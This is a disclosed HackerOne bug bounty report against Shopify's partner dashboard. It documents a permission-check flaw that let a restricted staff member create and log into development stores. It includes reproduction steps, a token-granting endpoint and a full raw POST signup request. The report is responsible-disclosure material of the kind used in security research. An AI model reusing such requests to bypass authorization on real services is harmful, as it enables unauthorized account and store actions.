# Add new development stores without permission

## Report Details
- **Report ID**: 1167453
- **URL**: https://hackerone.com/reports/1167453
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2021-04-17T22:12:56.071Z
- **Disclosed**: 2021-06-04T19:06:25.818Z

## Reporter
- **Username**: jmp_35p
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: shopify

## Vulnerability Information
Details
A staff member who only has permission to add and remove managed stores can also create development stores. It appears proper permission checks are not performed when /organizationID/stores/signup_object/dev_store endpoint is queried, as long as a staff member has store access, a token is returned. I decided to do this from the partner dashboard to proof that not only can development stores be created, they can also be logged into. Further information on setup and steps to reproduce are provided below.

Setup
Organization owner - Owner 
Staff member - Doe
1. Owner gives Doe both development store and managed store permission. See dev_store_B.png for details.
2. Doe logs in and visits https://partners.shopify.com/organizationID/stores/new and selects development store.
3. Owner edits Doe's permission so he can only add and remove managed stores. See dev_store.png for details.

Steps to reproduce
1. Doe proceeds to create the development store and gets logged in automatically. See dev_store_A.png, dev_store_C.png and dev_store_D.png for details.
2. Alternatively, send a GET request to /organizationID/stores/signup_object/dev_store to obtain the required token. See dev_store_G.png for details.
3. The token obtained above should be used in the following POST request.See dev_store_E.png and dev_store_F.png.

```
POST /services/signup/create HTTP/1.1
Host: app.shopify.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/86.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 1224
Origin: https://app.shopify.com
DNT: 1
Connection: close
Cookie: ...

_y=&ref=&ssid=&source=&source_url=&source_url_referer=&signup_code=&signup_source=development+shop&signup_source_details=test_app_or_theme&signup_page=&signup_page_referer=&signup_locale=&domain_to_connect=&signup%5Bshop_name%5D=newiez2&signup%5Bsubdomain%5D=&signup%5Bfirst_name%5D=&signup%5Blast_name%5D=&signup%5Bemail%5D=example%40gmail.com&signup%5Bpassword%5D=5syyyypT&signup%5Bconfirm_password%5D=5syyyypT&signup%5Baddress1%5D=Suite+10&signup%5Bcity%5D=London&signup%5Bprovince%5D=&signup%5Bzip%5D=Swe10928&signup%5Bcountry%5D=GB&signup%5Bphone%5D=&signup%5Bpos%5D=&signup%5Bextra%5D%5Baffiliate_shop%5D=eyJfcmFpbHMiOnsibWVzc2F&signup%5Bextra%5D%5Borganization_id%5D=1022333&signup%5Bextra%5D%5Bpartner_test_shop%5D=&signup%5Bsignup_types%5D%5B%5D=affiliate_shop&identity_account_experiment=

```

## Impact

Staff member can perform actions that require permission

## Attachments
- dev_store_A.png
- dev_store.png
- dev_store_B.png
- dev_store_C.png
- dev_store_D.png
- dev_store_E.png
- dev_store_F.png
- dev_store_G.png
